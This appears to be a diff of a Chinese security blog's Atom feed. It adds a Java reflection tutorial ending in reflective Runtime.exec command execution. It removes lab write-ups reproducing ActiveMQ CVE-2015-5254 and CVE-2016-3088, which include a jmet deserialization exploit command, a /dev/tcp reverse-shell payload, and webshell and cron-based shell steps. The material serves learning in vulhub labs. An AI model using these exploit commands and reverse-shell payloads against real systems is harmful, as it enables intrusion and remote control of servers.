+getConstructors()：获取所有public的Constructor；
+getDeclaredConstructors()：获取所有Constructor。
+</code></pre>
+<p>调用非public的Constructor时，必须首先通过setAccessible(true)设置允许访问。setAccessible(true)可能会失败。</p>
+<h1 id="反射的进阶使用">反射的进阶使用</h1>
+<h2 id="反射创建对象">反射创建对象</h2>
+<pre><code class="language-java">Class c = Class.forName(&quot;类的名称&quot;); // 创建Class对象 
+Object m1 =  c.newInstance(); // 创建类对象
+</code></pre>
+<h2 id="反射修改被final关键字修饰的成员变量">反射修改被final关键字修饰的成员变量</h2>
+<pre><code class="language-java">// 反射获取Field类的modifiers
+Field modifiers = field.getClass().getDeclaredField(&quot;modifiers&quot;);
+// 设置modifiers修改权限
+modifiers.setAccessible(true);
+// 修改成员变量的Field对象的modifiers值
+modifiers.setInt(field, field.getModifiers() &amp;~Modifier.FINAL);
+// 修改成员变量值
+field.set(类实例对象, 修改后的值);
+</code></pre>
+<h2 id="利用反射弹计算器">利用反射弹计算器</h2>
+<pre><code class="language-plain">package org.example;
+
+import java.lang.reflect.Method;
+
+public class ReflectionTest01 {
+    public static void main(String[] args) throws Exception{
+        Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);
+        Method method = c1.getMethod(&quot;exec&quot;, String.class);
+        Method RuntimeMethod = c1.getMethod(&quot;getRuntime&quot;);
+        Object o1 = RuntimeMethod.invoke(c1);
+        method.invoke(o1, &quot;deepin-calculator&quot;);
+    }
+}
+</code></pre>
+<p>写到一句话</p>
+<pre><code class="language-plain">package org.example;
+
+import java.lang.reflect.Method;
+
+public class ReflectionTest01 {
+    public static void main(String[] args) throws Exception{
+        /*Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);
+        Method method = c1.getMethod(&quot;exec&quot;, String.class);
+        Method RuntimeMethod = c1.getMethod(&quot;getRuntime&quot;);
+        Object o1 = RuntimeMethod.invoke(c1);
+        method.invoke(o1, &quot;deepin-calculator&quot;);*/
+      	//执行命令
+        Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class).invoke(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)),&quot;deepin-calculator&quot;);
+    }
+}
+</code></pre>
+<h2 id="java执行命令的三种方式">JAVA执行命令的三种方式</h2>
+<h3 id="0x01-调用-runtime-类进行命令执行">0x01 调用 Runtime 类进行命令执行</h3>
+<h3 id="0x02-processbuilder">0x02 ProcessBuilder</h3>
+<h3 id="0x03-使用-processimpl">0x03 使用 ProcessImpl</h3>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[JAVA序列化与反序列化]]></title>
         <id>https://www.yyxyy.xyz/post/java-xu-lie-hua-yu-fan-xu-lie-hua/</id>
@@ -765,148 +1330,6 @@ __builtin__ 和 __builtins__之间是什么关系呢？
 <p>参考链接：<a href="https://www.freebuf.com/articles/web/98619.html">https://www.freebuf.com/articles/web/98619.html</a></p>
 <p>​		<a href="https://www.cnblogs.com/hackxf/p/10480071.html">https://www.cnblogs.com/hackxf/p/10480071.html</a></p>
 <p>​		<a href="https://eustiar.com/archives/157">https://eustiar.com/archives/157</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CVE-2015-5254]]></title>
-        <id>https://www.yyxyy.xyz/post/cve-2015-5254/</id>
-        <link href="https://www.yyxyy.xyz/post/cve-2015-5254/">
-        </link>
-        <updated>2021-06-09T07:58:49.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="activemq-反序列化漏洞cve-2015-5254复现">ActiveMQ 反序列化漏洞（CVE-2015-5254）复现</h2>
-<h4 id="漏洞简介">漏洞简介</h4>
-<p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。</p>
-<h4 id="漏洞复现">漏洞复现</h4>
-<ol>
-<li>
-<p>漏洞利用过程</p>
-<ol>
-<li>构造可执行命令的序列化对象</li>
-<li>作为一个消息发送给目标61616端口</li>
-<li>访问的Web管理页面，读取消息，触发漏洞</li>
-</ol>
-</li>
-<li>
-<p>使用jmet进行漏洞利用</p>
-<pre><code class="language-shell"> wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
- mkdir external
-</code></pre>
-</li>
-<li>
-<p>执行命令</p>
-<ol>
-<li>
-<pre><code class="language-shell">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/sucess&quot; -Yp ROME   127.0.0.1   61616
-</code></pre>
-</li>
-</ol>
-</li>
-</ol>
-<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254/1.png" alt="" loading="lazy"></figure>
-<ol start="4">
-<li>此时目标站ActiveMQ会收到名为事件的队列，在admin/queues.jsp下面（账号admin密码admin）</li>
-</ol>
-<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254/2.png" alt="" loading="lazy"></figure>
-<ol start="5">
-<li>
-<p>点击这个消息便出发了漏洞</p>
-</li>
-<li>
-<p>此时进入容器，发现存在tmp目录已经创建说明漏洞利用成功</p>
-<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//3.png" alt="" loading="lazy"></figure>
-</li>
-</ol>
-<p>最后反弹shell</p>
-<p>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bin -i &gt;&amp; /dev/tcp/127.0.0.1/7777 0&gt;&amp;1&quot; -Yp ROME 192.168.180.133 61616</p>
-<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//4.png" alt="" loading="lazy"></figure>
-<p>点击消息</p>
-<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//5.png" alt="" loading="lazy"></figure>
-<p>反弹shell成功</p>
-<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//6.png" alt="" loading="lazy"></figure>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CVE-2016-3088]]></title>
-        <id>https://www.yyxyy.xyz/post/cve-2016-3088/</id>
-        <link href="https://www.yyxyy.xyz/post/cve-2016-3088/">
-        </link>
-        <updated>2021-06-09T07:57:28.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="cve-2016-3088漏洞复现">CVE-2016-3088漏洞复现</h1>
-<h2 id="背景描述">背景描述</h2>
-<p>ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用。</p>
-<h2 id="原理分析">原理分析</h2>
-<p>ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录，且路径在conf/jetty.xml中定义，定义如下：</p>
-<pre><code class="language-xml">&lt;bean class =“ org.eclipse.jetty.webapp.WebAppContext”&gt;
-    &lt;property name =“ contextPath” value =“ / fileserver” /&gt;
-    &lt;property name =“ resourceBase” value =“ $ {activemq.home} / webapps / fileserver” /&gt;
-    &lt;property name =“ logUrlOnStart” value =“ true” /&gt;
-    &lt;property name =“ parentLoaderPriority” value =“ true” /&gt;
-&lt;/ bean&gt;
-</code></pre>
-<pre><code>fileserver:储存文件的接口，可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，
-其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但是随后发现：
-1.其使用率并不高
-2.文件操作容易出现漏洞
-所以ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。
-</code></pre>
-<h2 id="漏洞利用">漏洞利用</h2>
-<p>首先写入一个文件，随后使用移动文件的请求将文件移动到任意位置，<br>
-造成任意文件写入漏洞。文件写入有如下方法可以利用：</p>
-<ol>
-<li>写入webshell</li>
-<li>写入cron或ssh key等文件</li>
-<li>写入jar或jetty.xml等库和配置文件</li>
-</ol>
-<h2 id="漏洞复现">漏洞复现</h2>
-<p>1.上传webshell，但是不会解析</p>
-<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/1.png" alt="" loading="lazy"></figure>
-<p>2.移动到api目录下面（api下面会解析）</p>
-<p>首先看一下api路径（(http://ip:8161/admin/test/systemProperties.jsp)）</p>
-<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/2.png" alt="" loading="lazy"></figure>
-<p>移动到api目录下。</p>
-<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/3.png" alt="" loading="lazy"></figure>
-<p>查看api目录</p>
-<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/4.png" alt="" loading="lazy"></figure>
-<p>3.执行命令</p>
-<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/5.png" alt="" loading="lazy"></figure>
-<p>利用完毕。</p>
-<p>4.利用cron添加定时任务反弹shell</p>
-<p>添加shell脚本</p>
-<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/6.png" alt="" loading="lazy"></figure>
-<p>移动shell脚本到/etc/cron.d下面</p>
-<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/7.png" alt="" loading="lazy"></figure>
-<p>反弹shell</p>
-<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/8.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="9"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/9.png" alt="" loading="lazy"></figure>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[docker命令学习]]></title>
-        <id>https://www.yyxyy.xyz/post/docker-ming-ling-xue-xi/</id>
-        <link href="https://www.yyxyy.xyz/post/docker-ming-ling-xue-xi/">
-        </link>
-        <updated>2021-06-06T03:58:04.000Z</updated>
-        <content type="html"><![CDATA[<h4 id="docker">docker</h4>
-<h6 id="开启docker">开启docker</h6>
-<pre><code class="language-shell">systemctl start docker
-</code></pre>
-<h6 id="关闭docker">关闭docker</h6>
-<pre><code class="language-shell">service docker stop  或者  systemctl stop docker
-</code></pre>
-<h6 id="容器列表">容器列表</h6>
-<pre><code class="language-shell">docker ps
-
-docker ps -a
-</code></pre>
-<h6 id="开启容器">开启容器</h6>
-<pre><code class="language-shell">docker start 容器名称  
-比如开启名字为cli容器： docker start cli
-</code></pre>
-<h6 id="vulhub靶场">vulhub靶场</h6>
-<pre><code class="language-shell">docker-compose up -d         //docker生成靶场
- 
-docker-compose down        //要进入另一个漏洞靶场，则先要结束掉当前漏洞靶场
-</code></pre>
 ]]></content>
     </entry>
 </feed>
